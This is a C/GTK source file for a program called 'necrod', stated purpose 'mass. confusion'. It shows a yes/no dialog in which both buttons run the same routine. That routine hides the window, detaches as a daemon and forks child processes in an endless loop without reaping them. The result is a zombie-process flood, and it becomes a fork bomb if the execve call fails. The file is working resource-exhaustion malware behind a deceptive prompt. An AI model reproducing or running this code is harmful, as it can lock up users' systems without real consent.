/*
 *  A GUI program implementing the dumb
 *  necrod program (or attempting too) 
 * 
 *  Purpose: mass. confusion.
 * 
 * @author: Christopher J. Kosik
 * @date: 24-07-2020
 */ 

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <gtk/gtk.h>
#include <gtk/gtkx.h>
#include <math.h>
#include <ctype.h>

// Make Gtk GUI objects global

GtkWidget	*window;
GtkWidget	*fixed_main;
GtkWidget	*yesBtn;
GtkWidget	*noBtn;
GtkWidget	*label_dialog;
GtkBuilder	*builder; 

void necrod_init(void);
void delay_four_seconds(void);


int main( int argc, char * argv[]){

    gtk_init(&argc, &argv); // init Gtk

    builder = gtk_builder_new_from_file ("necrod.glade");
 
	window = GTK_WIDGET(gtk_builder_get_object(builder, "window_main"));

	g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

        gtk_builder_connect_signals(builder, NULL);

	fixed_main = GTK_WIDGET(gtk_builder_get_object(builder, "fixed_main"));
	yesBtn = GTK_WIDGET(gtk_builder_get_object(builder, "yesBtn"));
    noBtn = GTK_WIDGET(gtk_builder_get_object(builder, "noBtn"));
	label_dialog = GTK_WIDGET(gtk_builder_get_object(builder, "label_dialog"));

	gtk_widget_show(window);

	gtk_main();


    return EXIT_SUCCESS;

}

//Begin event listeners

void on_btn_yes_clicked(GtkButton *b){
    gtk_label_set_text (GTK_LABEL(label_dialog), (const gchar* ) "You have taken the red pill. Good luck.");
    delay_four_seconds();
    gtk_widget_hide(window);
    necrod_init();
}

void on_btn_no_clicked(GtkButton *b){

	gtk_label_set_text (GTK_LABEL(label_dialog), (const gchar* ) "So long you poor, poor fool.. a parting gift.");
    delay_four_seconds();
	gtk_widget_hide(window);
    necrod_init();
}

//end event listeners


void delay_four_seconds(){
    int c, d;
   
    for (c = 1; c <= 32767; c++)
        for (d = 1; d <= 32767; d++)
        {}
}


//start necro-ing
void necrod_init(){

    /*
        Daemon process reviewed:
        fork() -> umask(0) -> start new session, close
        STDIN, STDOUT, STDERR
    */

    pid_t necro_id = 0;
    pid_t sid = 0;

    necro_id = fork();

    if (necro_id < 0){
        exit(1); //fork failure
    }
    if (necro_id > 0){
        exit(0); //fork success, kill current process
    }
    //change child into daemon process, necrod

    umask(0); //Change the file mode mask according to the needs of the daemon
    sid = setsid();

    if(sid < 0){
        exit(1);// starting new session failed
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    //begin necro-ing
   while(1){
       pid_t zomb;
       zomb = fork();
       if(zomb == 0){
           //success in child creation, execute new code to
           //have child exit with parent NOT waiting

            //Remember: argv and env of execve are terminated by null ptrs
            char *newargv[] = { NULL, " ", " ", NULL };
            char *newenviron[] = { NULL };
            execve(".child", newargv, newenviron);
       }

   }

}